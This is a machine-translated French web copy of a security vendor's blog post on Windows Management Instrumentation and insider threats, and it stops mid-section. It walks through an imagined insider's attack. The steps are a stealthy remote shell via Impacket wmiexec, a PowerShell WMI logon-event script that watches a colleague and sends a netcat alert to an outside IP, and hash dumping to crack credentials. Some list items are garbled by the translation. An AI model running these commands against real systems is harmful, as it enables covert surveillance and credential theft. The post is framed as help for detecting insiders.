<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧛🏻 🎳 👆🏻 Guide de Windows Management Instrumentation (WMI): Comprendre les attaques WMI 😶 👋🏾 👨‍🏭</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) est un sous-système PowerShell qui permet aux administrateurs d'accéder à de puissants outils de surveillance...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Guide de Windows Management Instrumentation (WMI): Comprendre les attaques WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) est un sous-système PowerShell qui permet aux administrateurs d'accéder à de puissants outils de surveillance du système. Cette boîte à outils a été conçue comme un outil d'administration système rapide et efficace, mais tout le monde ne l'utilise pas à de bonnes fins: avec son aide, les initiés peuvent espionner d'autres employés. La connaissance de cette vulnérabilité WMI facilite la détection et la lutte contre les menaces internes. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous examinerons ce que sont les outils WMI, pourquoi ils sont nécessaires et comment ils peuvent être utilisés pour suivre l'activité des initiés dans le système. Nous avons également compilé un guide plus détaillé sur les événements WMI et l'espionnage d'initié, que vous pouvez </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">télécharger gratuitement.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Brève revue: qu'est-ce que le WMI et à quoi sert-il?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous donnons un exemple concret. </font><font style="vertical-align: inherit;">À l'aide de WMI, vous pouvez demander, par exemple, tous les gros fichiers Excel situés dans un répertoire particulier, puis recevoir une notification chaque fois que vous créez un fichier avec une taille donnée, par exemple 1 Mo. </font><font style="vertical-align: inherit;">La </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Register-WmiEvent vous</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permet de faire tout cela avec une seule ligne, pas trop compliquée dans PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entre de bonnes mains, WMI peut servir plusieurs objectifs, mais il peut également devenir un outil pour les activités d'initiés malveillants. </font><font style="vertical-align: inherit;">Vous pouvez facilement imaginer comment une personne avec les habitudes d'Edward Snowden utilise WMI pour espionner ses collègues. </font><font style="vertical-align: inherit;">Pour ce faire, il n'a même pas besoin de connaissances techniques particulières.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supposons que notre initié hypothétique espionne «accidentellement» que son collègue Lex télécharge périodiquement de gros fichiers Excel contenant les numéros de sécurité sociale et d'autres données personnelles des clients. </font><font style="vertical-align: inherit;">Dans ce cas, notre initié discret peut construire quelque chose comme ceci:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce code interroge l'objet </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour accéder aux informations sur la création du fichier Excel dans le répertoire spécifié, puis démarre l'exécution du bloc de script. </font><font style="vertical-align: inherit;">Vers la fin de cet article, nous allons voir de plus près à quoi pourrait ressembler ce bloc de scénario dans le cas de notre initié hypothétique.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">À quoi sert le Windows Management Toolkit?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de continuer à explorer comment WMI peut être utilisé par des initiés à des fins de suivi, il convient de noter qu'il a de nombreuses utilisations légitimes. </font><font style="vertical-align: inherit;">L'objectif global de ce système est de rassembler tous les contrôles des appareils et des applications dans les réseaux d'entreprise. </font><font style="vertical-align: inherit;">Ainsi, WMI peut être utilisé:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour collecter des informations sur l'état des systèmes informatiques locaux et distants </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">paramètres de sécurité pour les ordinateurs et applications distants</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">définition et modification des propriétés système</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">définition et modification des autorisations pour les utilisateurs et les groupes autorisés</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exécution de code et sérialisation d'objets (une </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sorte de "SSH sur les stéroïdes"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">attribuer et modifier des étiquettes de lecteur</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">création d'un calendrier de processus</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">référentiels d'objets de sauvegarde</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">activer et désactiver la journalisation des erreurs</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Toutes ces fonctionnalités sont accessibles à l'aide de PowerShell et WMIC, l'interface de ligne de commande WMI. </font><font style="vertical-align: inherit;">Comme vous pouvez le voir, WMI a une grande variété d'applications, et ce système vous permet de suivre et de modifier de nombreux paramètres différents sur un réseau informatique.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Architecture d'instrumentation de gestion Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La boîte à outils WMI fait partie du système d'exploitation Windows et est préinstallée sur tous les systèmes d'exploitation à partir de Windows 2000. WMI comprend les composants suivants:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le service WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est une implémentation du système WMI sous Windows. </font><font style="vertical-align: inherit;">Ce processus apparaît sous le nom «Windows Management Instrumentation» et constitue le lien entre les fournisseurs WMI, le référentiel WMI et les applications de gestion. </font><font style="vertical-align: inherit;">Ce processus démarre automatiquement lorsque vous allumez l'ordinateur.</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le gestionnaire d'objets CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est un système qui se situe entre l'application de gestion et les fournisseurs WMI. </font><font style="vertical-align: inherit;">Elle demande des données à ces fournisseurs, puis les transfère à l'application.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'API WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> effectue ces opérations et fournit aux applications un accès à l'infrastructure WMI sans être lié au type de périphérique utilisé.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un consommateur WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est une entité qui envoie des requêtes aux objets via le gestionnaire d'objets. </font><font style="vertical-align: inherit;">En règle générale, un consommateur WMI est une application de surveillance, telle que le moniteur réseau PRTG, exécutant l'application ou un script PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Faire des demandes WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La façon la plus simple d'exécuter une demande WMI consiste à exécuter WMIC sur une ligne de commande Windows standard. </font><font style="vertical-align: inherit;">Suivez ces étapes pour obtenir des informations sur le processeur utilisé sur l'ordinateur local:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ouvrir l'invite de commande</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tapez WMIC pour appeler le programme et appuyez sur Entrée </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La fenêtre d'invite de commande WMIC apparaît.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">À l'invite de commandes, vous pouvez exécuter des demandes WMI. </font><font style="vertical-align: inherit;">La demande la plus simple consiste à afficher des informations sur le processeur local, qui peuvent être effectuées à l'aide de la commande suivante:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Les résultats seront affichés sur la ligne de commande.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Presque toutes les commandes qui seront discutées ci-dessous sont exécutées de cette manière. </font><font style="vertical-align: inherit;">Cependant, WMI vous permet de recevoir des informations beaucoup plus détaillées que les informations sur le processeur, y compris des ordinateurs et applications distants.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Atelier sur l'utilisation des événements WMI pour surveiller un système</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cette section, nous verrons comment utiliser WMI pour exécuter des commandes et surveiller les processus sur des ordinateurs distants. </font><font style="vertical-align: inherit;">Ces techniques peuvent être utilisées dans le cadre </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">du système d'analyse du comportement des utilisateurs et des entités (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour surveiller automatiquement les processus dans tout le système et </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rechercher les menaces internes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui sont mises en évidence par un comportement suspect ou des événements anormaux.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisation de la fonctionnalité wmiexec d'Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans WMI, vous pouvez exécuter diverses fonctions en plus de la gestion des événements. Dans celui-ci, vous pouvez démarrer des processus et exécuter des commandes dans des fenêtres Windows sur des ordinateurs locaux et distants. Pour le plaisir, essayez d'entrer la commande </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> appelez create 'notepad.exe' dans une session PowerShell pour ouvrir l'ancien éditeur de texte Microsoft. Il utilise le merveilleux outil de ligne de commande wmic inclus avec WMI. Super, non? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si j'ai ajouté l'option / Node:, puis le nom de l'ordinateur Windows distant, je pourrais exécuter le Bloc-notes sur celui-ci, à condition que je dispose des autorisations appropriées. Il est clair qu'au niveau pratique, wmic est un outil indispensable pour les administrateurs système.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Avant de commencer à vous en vouloir: je sais qu'il existe des </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applets de commande PowerShell</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> équivalentes </font><font style="vertical-align: inherit;">. Cependant, je trouve la syntaxe wmic plus facile à retenir. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce serait formidable si je pouvais utiliser WMI pour créer un pseudo-shell simple et invisible.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Un pseudo-shell caché créé avec wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
À ma chance, cela peut être fait dans Impacket. Dans l'environnement de test Amazon, j'ai utilisé mon </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> préféré </font><font style="vertical-align: inherit;">pour accéder à WMI via la machine virtuelle Linux. Wmiexec offre la possibilité de créer un pseudo-shell: chaque fois qu'une commande est entrée côté client, un shell séparé est créé sur l'ordinateur cible pour exécuter cette commande. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Psexec et smbexec utilisent les services Windows pour exécuter des commandes sur un système distant. Smbexec s'exécute en silence, car il crée et supprime rapidement un service, et psexec, en revanche, le laisse en vue.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 L'outil wmiexec exécute directement cmd.exe pour exécuter la commande à distance. </font><font style="vertical-align: inherit;">La commande créée se trouve dans l'Observateur d'événements. </font><font style="vertical-align: inherit;">Notez que nous avons évité les services Windows qui attirent l'attention. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'outil wmiexec n'affecte pas du tout les services, mais utilise les fonctionnalités WMI décrites ci-dessus pour démarrer directement le processus. </font><font style="vertical-align: inherit;">Lorsqu'ils recherchent des sources possibles de menaces, les experts en sécurité commencent rarement par WMI, tandis que les services sont généralement un bon endroit pour commencer à rechercher des preuves d'une attaque. </font><font style="vertical-align: inherit;">Bon mouvement, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisation des événements WMI pour surveiller les utilisateurs</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alors que je m'amusais avec l'idée que j'étais si intelligent et que j'expérimentais avec WMI, il s'est avéré que les gars impliqués dans les tests de pénétration avaient depuis longtemps compris comment tout fonctionnait. Vous devriez certainement lire </font><font style="vertical-align: inherit;">la </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">présentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> étonnante de </font><font style="vertical-align: inherit;">Matt Graeber de la conférence Black Hat 2015, où il explique comment les attaquants peuvent transformer WMI et tout son arsenal d'événements en un outil de piratage. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans mon histoire, j'imagine un initié à la Snowden qui a des connaissances techniques, mais pas une profonde sagesse de piratage, et qui fait confiance aux autres employés. Cette personne n'a pas besoin de tout savoir sur WMI. Il doit seulement savoir ce qui est nécessaire pour travailler sur un ordinateur distant et déclencher des événements.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En plus des objets fichier, il existe une autre classe intéressante d'objets qui peuvent être appris à l'aide de WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . L'interrogation de cet objet Windows de base vous permet de trouver les utilisateurs qui sont actuellement sur le système. Vous pouvez ensuite utiliser le bloc de script d'action Register-WmiEvent pour exécuter le script PowerShell lorsqu'un nouvel utilisateur se connecte à distance. Vous avez compris? Un attaquant peut recevoir des notifications chaque fois qu'un utilisateur qu'il surveille se connecte au système cible. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici ce que j'ai esquissé:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La question suivante est de savoir comment programmer l'exécution d'un bloc de script. Un mystérieux initié de mes fantasmes s'intéresse à un utilisateur spécifique - Cruell. Notre méchante espionnait lentement Cruella et prévoit maintenant d'utiliser les informations collectées pour pirater son compte de travail. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La tâche du bloc de script est de vérifier qui est connecté et de déterminer s'il s'agissait de Cruella. J'ai écrit quelques lignes de code PowerShell à cet effet, mais ce n'est clairement pas la meilleure façon. Je n'utilise pas les informations d'événement transmises au bloc de script, à savoir les informations sur le nouvel utilisateur. Je rencontre des obstacles dont je ne comprends pas les raisons pour le moment. Cela nécessite plus de connaissances techniques que notre hypothétique initié a ou est prêt à acquérir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Au lieu de cela, j'ai simplement parcouru la liste des utilisateurs retournés par gwmi Win32_Process (essayez d'exécuter cette applet de commande dans une session PowerShell) et les ai mis en correspondance avec le paramètre Cruell. </font><font style="vertical-align: inherit;">Vous pouvez admirer ma décision finale:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent vous permet de maintenir la furtivité, car il ne démarre que lorsque vous vous connectez à nouveau, au lieu de demander régulièrement l'objet Win32_Process, ce qui peut être assez visible. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
N'oubliez pas que notre initié essaie de ne pas attirer l'attention. </font><font style="vertical-align: inherit;">Elle a accès au système distant via psexec, smbexec ou wmiexec (la manière la plus discrète). </font><font style="vertical-align: inherit;">Cependant, elle n'a pas besoin de se déplacer constamment dans les deux sens autour du système de la victime. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C'est la beauté de l'utilisation des événements WMI. </font><font style="vertical-align: inherit;">Vous pouvez attendre la notification de Register-WmiEvent, puis procéder calmement.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intégration Netcat et WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais comment le script apporte-t-il la nouvelle brûlante que Cruella est connecté à l'ordinateur cible? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous remarquez que j'ai utilisé les commandes Netcat ci-dessus, vous pouvez vous donner un plus. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est un utilitaire bien connu et universel qui vous permet d'établir des connexions (facultatif pour les logiciels malveillants). Avec lui, vous pouvez effectuer une connexion inverse ou simplement envoyer des messages sur le réseau. J'ai saisi cette deuxième opportunité. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le script ci-dessus envoie un message Netcat en mode veille et affiche «Cruella connecté». Mission accomplie. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez imaginer comment notre escroc </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">vide</font></a><font style="vertical-align: inherit;"> les hachages avec l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">outil secretsdump Impacket</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, crackez le hachage des informations d'identification Cruella, puis lancez wmiexec, à l'aide des autorisations Cruella, pour rechercher des données plus précieuses.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Le code Register-WmiEvent peut être exécuté directement. </font><font style="vertical-align: inherit;">Faites attention à l'identifiant d'événement affiché</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dépannage de la surveillance WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans le cadre de cet exemple, je voulais exécuter à distance (à l'aide de wmiexec) un programme utile qui m'alerterait lorsqu'un utilisateur particulier, c'est-à-dire Cruella, se connecte. Après cela, j'ai pu réinitialiser et casser ses informations d'identification en toute sécurité. Ce serait le moyen le plus discret - accès à distance et aucun fichier. Le seul problème, il m'a semblé au début, était le caractère temporaire des événements WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Par conséquent, je devais inclure mon long registre-WMIEvent obscène (ci-dessous) dans la ligne de commande PowerShell avec le paramètre –noexit, qui garantit que la session PowerShell est enregistrée après Register-Event et, par conséquent, l'événement est enregistré.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quand j'ai commencé à travailler là-dessus, j'ai réalisé que je devais "convertir" des caractères spéciaux tels que $, "et |, et les passer directement sous forme de littéraux à PowerShell. </font><font style="vertical-align: inherit;">Autre casse-tête: j'ai fini par devoir abandonner l'utilisation des lignes verticales car elles provoquaient des erreurs d'analyse. </font><font style="vertical-align: inherit;">Ne demandez pas. </font><font style="vertical-align: inherit;">Peu à peu, je suis arrivé à cette longue ligne de code:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il semblait prometteur et semblait fonctionner correctement selon le journal des événements Windows dans le système cible. </font><font style="vertical-align: inherit;">Cependant, en y regardant de plus près, j'ai réalisé que cela ne fonctionne pas. </font><font style="vertical-align: inherit;">Je suis sûr qu'à la fin je pourrais l'amener à la bonne forme, mais pour cela, j'aurais besoin de temps et de café, beaucoup de café. </font><font style="vertical-align: inherit;">Il existe une autre option, un peu moins discrète et pas du tout sans fichier: vous pouvez utiliser smbclient pour transférer le script, puis l'exécuter directement sur l'ordinateur cible.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 L'exécution à distance de l'applet de commande Register-Event complexe me semblait absolument correcte. </font><font style="vertical-align: inherit;">Mais cela n'a pas fonctionné. </font><font style="vertical-align: inherit;">Eh bien, </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
hélas. Hélas, à ce stade, mes hypothèses qu'une puce, mais pas initié trop expérimenté pourrait facilement utiliser des </font><font style="vertical-align: inherit;">événements temporaires WMI pour la </font><font style="vertical-align: inherit;">surveillance secrète a commencé à se désagréger.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pourquoi utiliser des événements constants pour l'observation? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le correct et en même temps nécessitant une connaissance plus approfondie est d'utiliser des événements WMI persistants. Les événements WMI permanents, bien que d'une certaine complexité, sont non seulement un outil plus efficace pour les espions internes que les événements temporaires, mais ils vous permettent également de surveiller plus efficacement les menaces internes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
